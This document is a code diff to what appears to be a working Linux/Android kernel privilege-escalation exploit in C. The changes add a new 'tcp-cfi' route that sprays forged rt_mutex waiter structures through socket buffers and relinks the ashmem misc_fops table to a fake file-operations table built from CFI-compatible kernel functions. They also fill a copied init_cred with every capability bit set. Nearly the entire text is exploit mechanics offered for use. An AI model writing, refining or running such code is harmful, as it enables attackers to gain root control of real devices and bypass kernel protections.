@@ -138,8 +138,9 @@ void log_startup_context(void) {
              getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
              enforce);
   pr_success("startup limits pid=%d %s\n", getpid(), limits);
-  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
-             getpid(), BUILD_VARIANT_LABEL);
+  pr_success("build config pid=%d label=%s route=%s\n", getpid(),
+             BUILD_VARIANT_LABEL,
+             tcp_route_selected() ? "tcp-cfi" : "pselect");
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
@@ -211,11 +212,10 @@ static void fill_init_cred_copy(unsigned char *p, size_t off) {
   unsigned char *c = p + off;
   memset(c, 0, 136);
   put32(c, 0, 1);
-  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
+  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
+    uint64_t cap = 0xFFFFFFFFFFFFFFFFULL;
+    memcpy(c + CRED_CAPS_OFF + i * 8, &cap, sizeof(cap));
+  }
 }
 
 pid_t clone_child(void) {
@@ -334,65 +334,111 @@ int prepare_skb_payload(uintptr_t base) {
   long long payload_delta = tcp ? 0 : SKB_DATA_DELTA;
   size_t chunk_bias = tcp ? 0xe80 : (size_t)SKB_FRAG_BIAS;
   size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t)FAKE_TASK_OFF;
+  size_t lock_off = tcp ? (size_t)TCP_LOCK_OFF : (size_t)LOCK_OFF;
+  size_t w0_off = tcp ? (size_t)TCP_W0_OFF : (size_t)W0_OFF;
 
   uintptr_t payload_base = base + payload_delta;
 
-  fake_lock = payload_base + LOCK_OFF;
-  fake_w0 = payload_base + W0_OFF;
-  fake_task = payload_base + fake_task_off;
-  fake_fops = payload_base + FOPS_TABLE_OFF;
-  if (pselect_custom_write) {
-    if (pselect_child_node) {
-      if (pselect_custom_write == 2) {
-        /* W2 uses init_cred; resolve it from the selected device entry. */
-        fake_right = data_addr(g_init_cred_image);
-      } else {
-        /* W1 targets the initialized page at base+0x100. */
-        fake_right = base + 0x100;
-      }
-    } else {
-      fake_right = 0;  /* leaf: write 0 */
-    }
-    fake_left = 0;
-    if (pselect_custom_write == 2) {
-      fake_fops = payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
-    }
-    fake_parent = pselect_custom_target - 8;
-  }
+  uintptr_t write_pc;
+  uintptr_t write_right;
+  uintptr_t write_left;
+  uint64_t waiter_task;
+  uint64_t task_group;
+  uint64_t pi_top_task;
+  uint32_t w0_prio;
 
-  uintptr_t write_pc = fake_parent;
-  uintptr_t write_right = fake_right;
-  uintptr_t write_left = fake_left;
-  uint64_t waiter_task = INIT_TASK;
-  uint64_t task_group = ROOT_TASK_GROUP;
-  uint64_t pi_top_task = INIT_TASK;
+  if (tcp) {
+    /* FOPS payload (rmp): the ONE race-time write relinks
+     * misc_fops <- fake_fops through pi_tree_entry
+     * {pc=value, right=0, left=target}; every stage after that runs on
+     * the cfi primitives in cfi.c. Waiter prio must stay >120 so the
+     * stale waiter becomes top waiter and rt_mutex_dequeue_pi erases it. */
+    fake_lock = payload_base + TCP_LOCK_OFF;
+    fake_w0 = payload_base + TCP_W0_OFF;
+    fake_task = payload_base + fake_task_off;
+    fake_fops = payload_base + TCP_FAKE_FOPS_OFF;
+    g_binwrite_target = payload_base + TCP_SCRATCH_OFF;
+    write_pc = fake_fops;
+    write_right = 0;
+    write_left = data_addr(KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF);
+    waiter_task = SLIDE_INIT_TASK;
+    task_group = SLIDE_ROOT_TASK_GROUP;
+    pi_top_task = SLIDE_INIT_TASK;
+    w0_prio = TCP_FAKE_WAITER_PRIO;
+  } else {
+    fake_lock = payload_base + LOCK_OFF;
+    fake_w0 = payload_base + W0_OFF;
+    fake_task = payload_base + fake_task_off;
+    fake_fops = payload_base + FOPS_TABLE_OFF;
+    if (pselect_custom_write) {
+      if (pselect_child_node) {
+        if (pselect_custom_write == 2) {
+          /* W2 uses init_cred; resolve it from the selected device entry. */
+          fake_right = data_addr(g_init_cred_image);
+        } else {
+          /* W1 targets the initialized page at base+0x100. */
+          fake_right = base + 0x100;
+        }
+      } else {
+        fake_right = 0;  /* leaf: write 0 */
+      }
+      fake_left = 0;
+      if (pselect_custom_write == 2) {
+        fake_fops = payload_base + CRED_COPY_OFF;
+      }
+      fake_parent = pselect_custom_target - 8;
+    }
+
+    write_pc = fake_parent;
+    write_right = fake_right;
+    write_left = fake_left;
+    waiter_task = INIT_TASK;
+    task_group = ROOT_TASK_GROUP;
+    pi_top_task = INIT_TASK;
+    w0_prio = FAKE_WAITER_PRIO;
+  }
 
   int compact = active_offsets && active_offsets->compact_waiter;
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + chunk_bias;
 
-    put32(p, LOCK_OFF + 0x00, 0);
-    put64(p, LOCK_OFF + 0x08, fake_w0);
-    put64(p, LOCK_OFF + 0x10, fake_w0);
-    put64(p, LOCK_OFF + 0x18, fake_task | 1);
+    put32(p, lock_off + 0x00, 0);
+    put64(p, lock_off + 0x08, fake_w0);
+    put64(p, lock_off + 0x10, fake_w0);
+    put64(p, lock_off + 0x18, fake_task | 1);
 
     if (compact) {
       /* 6.1 COMPACT_RT_MUTEX_WAITER:
        * tree_entry[0x18] pi_tree_entry[0x18] task@0x30 lock@0x38
        * wake_state@0x40 prio@0x44 deadline@0x48 ww_ctx@0x50 */
-      put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
-      put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
-      put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
-      put64(p, W0_OFF + 0x18, write_pc);    /* pi_tree_entry.rb_parent_color */
-      put64(p, W0_OFF + 0x20, write_right); /* pi_tree_entry.rb_right */
-      put64(p, W0_OFF + 0x28, write_left);  /* pi_tree_entry.rb_left */
-      put64(p, W0_OFF + 0x30, waiter_task); /* task */
-      put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
-      put32(p, W0_OFF + 0x40, 0);           /* wake_state */
-      put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
-      put64(p, W0_OFF + 0x48, 0);           /* deadline */
-      put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
+      put64(p, w0_off + 0x00, 1);           /* tree_entry.rb_parent_color */
+      put64(p, w0_off + 0x08, 0);           /* tree_entry.rb_right */
+      put64(p, w0_off + 0x10, 0);           /* tree_entry.rb_left */
+      put64(p, w0_off + 0x18, write_pc);    /* pi_tree_entry.rb_parent_color */
+      put64(p, w0_off + 0x20, write_right); /* pi_tree_entry.rb_right */
+      put64(p, w0_off + 0x28, write_left);  /* pi_tree_entry.rb_left */
+      put64(p, w0_off + 0x30, waiter_task); /* task */
+      put64(p, w0_off + 0x38, fake_lock);   /* lock */
+      put32(p, w0_off + 0x40, 0);           /* wake_state */
+      put32(p, w0_off + 0x44, w0_prio);     /* prio */
+      put64(p, w0_off + 0x48, 0);           /* deadline */
+      put64(p, w0_off + 0x50, 0);           /* ww_ctx */
+
+      if (tcp) {
+        /* Fake fops table: three real function pointers only — nothing
+         * else is ever called on the hijacked fd. llseek seeds the
+         * fake_w0 marker and is repaired to noop_llseek right after
+         * acquire (cfi_try_acquire). */
+        put64(p, TCP_FAKE_FOPS_OFF + FOPS_OWNER_OFF, 0);
+        put64(p, TCP_FAKE_FOPS_OFF + FOPS_LLSEEK_OFF, fake_w0 + 0x18);
+        put64(p, TCP_FAKE_FOPS_OFF + FOPS_READ_ITER_OFF,
+              cfi_plant_text_addr(CONFIGFS_READ_ITER_OFF));
+        put64(p, TCP_FAKE_FOPS_OFF + FOPS_WRITE_ITER_OFF,
+              cfi_plant_text_addr(CONFIGFS_BIN_WRITE_ITER_OFF));
+        put64(p, TCP_FAKE_FOPS_OFF + FOPS_IOCTL_OFF,
+              cfi_plant_text_addr(ASHMEM_IOCTL_OFF));
+      }
     } else {
       /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
       put64(p, W0_OFF + 0x00, 1);
@@ -438,16 +484,20 @@ int prepare_skb_payload(uintptr_t base) {
     put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
     put64(p, fake_task_off + ft_pi_blocked_off, 0);
 
-    put64(p, RIGHT_OFF + 0x00, fake_parent);
-    put64(p, RIGHT_OFF + 0x08, 0);
-    put64(p, RIGHT_OFF + 0x10, 0);
+    /* Tree-node scratch words and the init_cred copy are pselect-overlay
+     * only; the tcp payload carries its whole write in the waiter. */
+    if (!tcp) {
+      put64(p, RIGHT_OFF + 0x00, fake_parent);
+      put64(p, RIGHT_OFF + 0x08, 0);
+      put64(p, RIGHT_OFF + 0x10, 0);
 
-    put64(p, LEFT_OFF + 0x00, fake_parent);
-    put64(p, LEFT_OFF + 0x08, 0);
-    put64(p, LEFT_OFF + 0x10, 0);
+      put64(p, LEFT_OFF + 0x00, fake_parent);
+      put64(p, LEFT_OFF + 0x08, 0);
+      put64(p, LEFT_OFF + 0x10, 0);
 
-    if (pselect_custom_write >= 2) {
-      fill_init_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
+      if (pselect_custom_write >= 2) {
+        fill_init_cred_copy(p, CRED_COPY_OFF);
+      }
     }
   }
   return 1;
